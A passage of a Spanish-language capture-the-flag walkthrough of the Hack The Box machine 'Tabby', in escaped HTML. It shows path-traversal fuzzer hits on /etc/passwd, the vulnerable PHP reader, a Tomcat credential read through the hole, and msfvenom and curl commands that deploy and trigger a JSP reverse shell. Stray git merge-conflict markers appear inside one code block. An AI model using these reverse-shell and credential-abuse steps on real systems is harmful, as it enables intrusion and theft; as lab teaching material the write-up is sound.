&lt;span class=&#34;c1&#34;&gt;#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   |    `   \(  &amp;lt;_&amp;gt; )|  |  |    `   \(  &amp;lt;_&amp;gt; )|  |  |    |     \     /|   |  \  #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#          \/                      \/                                      \/   #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                              - DotDotPwn v3.0.2 -                             #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                         The Directory Traversal Fuzzer                        #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                         http://dotdotpwn.sectester.net                        #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                            dotdotpwn@sectester.net                            #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                                                                               #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#                               by chr1x &amp;amp; nitr0us                              #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#################################################################################&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Report name: Reports/megahosting.htb_09-24-2020_01-28.txt

&lt;span class=&#34;o&#34;&gt;[==========&lt;/span&gt; TARGET &lt;span class=&#34;nv&#34;&gt;INFORMATION&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==========]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Hostname: megahosting.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Protocol: http
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Port: &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[===========&lt;/span&gt; TRAVERSAL &lt;span class=&#34;nv&#34;&gt;ENGINE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===========]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating Traversal patterns &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;mix of dots and slashes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Multiplying &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;times&lt;/span&gt; the traversal patterns &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-d switch&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating the Special Traversal patterns
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Translating &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;back&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;slashes in the filenames
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adapting the filenames according to the OS &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; detected &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Including Special sufixes
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Traversal Engine DONE ! - Total traversal tests created: &lt;span class=&#34;m&#34;&gt;11028&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[===========&lt;/span&gt; TESTING &lt;span class=&#34;nv&#34;&gt;RESULTS&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;============]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ready to launch 5000.00 traversals per second
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press Enter to start the testing &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;You can stop it pressing Ctrl + C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Replacing &lt;span class=&#34;s2&#34;&gt;&amp;#34;TRAVERSAL&amp;#34;&lt;/span&gt; with the traversals created and sending
. 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;../../../../etc/passwd &amp;lt;- VULNERABLE

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;../../../../../etc/passwd &amp;lt;- VULNERABLE

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;../../../../../../etc/passwd &amp;lt;- VULNERABLE
. . 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;..%2f..%2f..%2f..%2fetc%2fpasswd &amp;lt;- VULNERABLE

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;..%2f..%2f..%2f..%2f..%2fetc%2fpasswd &amp;lt;- VULNERABLE

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing URL: http://megahosting.htb/news.php?file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd &amp;lt;- VULNERABLE
. ^C
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Total Traversals found: &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Fuzz testing aborted
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Report saved: Reports/megahosting.htb_09-24-2020_01-28.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos la lista de usuarios que podriamos utilizar posteriormente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_4.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además de ello logramos obtener el codigo fuente de la pagina vulnerable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
<<<<<<< HEAD
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:news.php&#34; data-lang=&#34;php:news.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
=======
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:news.php&#34; data-lang=&#34;php:news.php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
>>>>>>> 23f7fea229b3a22c96ab504c60b48069479aad9c
&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;files/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos una busqueda de archivos conocidos de linux por posibles contraseñas o configuraciones para ingresar pero no encontramos nada.&lt;/p&gt;
&lt;h1 id=&#34;http---puerto-8080&#34;&gt;HTTP - PUERTO 8080&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 8080 en Apache Tomcat, donde vemos un mensaje que indica que Tomcat se instalo satisfactoriamente y muestran algunas direcciones de la maquina, pero lo interesante es la nota que dejan.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_5.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Indica que los usuarios estan &amp;ldquo;definidos&amp;rdquo; en la direccion &lt;code&gt;/etc/tomcat9/tomcat-users.xml&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;NOTE: For security reasons, using the manager webapp is restricted to users with role &lt;span class=&#34;s2&#34;&gt;&amp;#34;manager-gui&amp;#34;&lt;/span&gt;. The host-manager webapp is restricted to users with role &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin-gui&amp;#34;&lt;/span&gt;. Users are defined in /etc/tomcat9/tomcat-users.xml.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y tambien algunas variables que son necesarias para tomcat, como CATALINA_HOME y CATALINA_BASE:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al utilizar tal direccion en la pagina con vulnerabilidad LFI no resulto, aunque el archivo &lt;code&gt;RUNNING.txt.gz&lt;/code&gt; es posible obtenerlo pero no de forma completa. Por lo que instalamos &lt;code&gt;tomcat9&lt;/code&gt; en nuestra maquina para verificar que archivos son los que se pueden encontrar en tales carpetas. Vemos que existen algunos archivos dentro de la carpeta &lt;code&gt;/usr/share/tomcat9/&lt;/code&gt; en los cuales al pasarlo en la pagina vulnerable podemos leerlo, incluyendo el archivo &lt;code&gt;tomcat-users.xml&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/tabby$ tree /usr/share/tomcat9/
/usr/share/tomcat9/
├── bin
│   ├── bootstrap.jar
│   │   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
├── default.template
├── etc
│   ├── catalina.properties
│   ├── context.xml
│   ├── jaspic-providers.xml
│   ├── logging.properties
│   ├── server.xml
│   ├── tomcat-users.xml
│   └── web.xml
├── lib
│   ├── annotations-api.jar -&amp;gt; ../../java/tomcat9-annotations-api.jar
│   &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└── logrotate.template

&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; directories, &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt; files
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un usuario y contraseña en &lt;code&gt;http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml&lt;/code&gt; el cual tiene los roles &lt;code&gt;admin-gui y manager-script&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;?&amp;gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&amp;lt;tomcat-users &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://tomcat.apache.org/xml&amp;#34;&lt;/span&gt;
              xmlns:xsi&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
              xsi:schemaLocation&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://tomcat.apache.org/xml tomcat-users.xsd&amp;#34;&lt;/span&gt;
              &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&amp;gt;
	
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

   &amp;lt;role &lt;span class=&#34;nv&#34;&gt;rolename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin-gui&amp;#34;&lt;/span&gt;/&amp;gt;
   &amp;lt;role &lt;span class=&#34;nv&#34;&gt;rolename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;manager-script&amp;#34;&lt;/span&gt;/&amp;gt;
   &amp;lt;user &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$3&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;cureP4s5w0rd123!&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin-gui,manager-script&amp;#34;&lt;/span&gt;/&amp;gt;
&amp;lt;/tomcat-users&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos ingresar con las credenciales al panel pero recordemos que en el mensaje del index indica que los usuarios con roles &lt;code&gt;admin-gui&lt;/code&gt; no tienen acceso al panel de &lt;code&gt;/manager&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_6.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos en &lt;code&gt;/host-manager/html&lt;/code&gt; donde logramos ingresar, mas no logramos hacer nada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_7.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;tomcat---user&#34;&gt;TOMCAT - USER&lt;/h1&gt;
&lt;p&gt;Intentamos utilizar el exploit &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload&#34;&gt;&lt;strong&gt;tomcat_mgr_upload&lt;/strong&gt;&lt;/a&gt; de metasploit pero este mostraba errores ya que la pagina &lt;code&gt;/manager&lt;/code&gt; esta &amp;ldquo;desactivada&amp;rdquo;, exploramos otras opciones y encontramos &lt;a href=&#34;https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/&#34;&gt;&lt;strong&gt;Tomcat exploit variant : host-manager&lt;/strong&gt;&lt;/a&gt; pero este solo funciona en maquinas Windows. Investigamos un poco sobre como se sube estos archivos (.war) y encontramos que es posible subir estos mediante &lt;a href=&#34;https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script&#34;&gt;&lt;code&gt;curl&lt;/code&gt;&lt;/a&gt; utilizando las credenciales y un archivo &lt;code&gt;.war&lt;/code&gt; sin necesidad de acceder al GUI de la aplicacion.&lt;/p&gt;
&lt;p&gt;Para ello vamos a tener que crear un payload como en la maquina &lt;a href=&#34;https://sckull.github.io/posts/thompson/#reverse-shell---jsp&#34;&gt;&lt;strong&gt;THM/BSIDESGT - THOMPSON&lt;/strong&gt;&lt;/a&gt; y poner a la escucha metasploit:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p java/jsp_shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tun0 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; -f war &amp;gt; batman.war
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y realizamos el deploy de nuestro archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl --upload-file batman.war --user &lt;span class=&#34;s1&#34;&gt;&amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/batman&amp;amp;update=True&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ponemos a la escucha metasploit o netcat en el puerto indicado en el payload y ejecutamos nuestra &amp;ldquo;applicacion&amp;rdquo; o &lt;code&gt;batman.war&lt;/code&gt; visitando la siguiente url:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl --user &lt;span class=&#34;s1&#34;&gt;&amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39;&lt;/span&gt; http://10.10.10.194:8080/batman
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario &lt;code&gt;tomcat&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_8.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
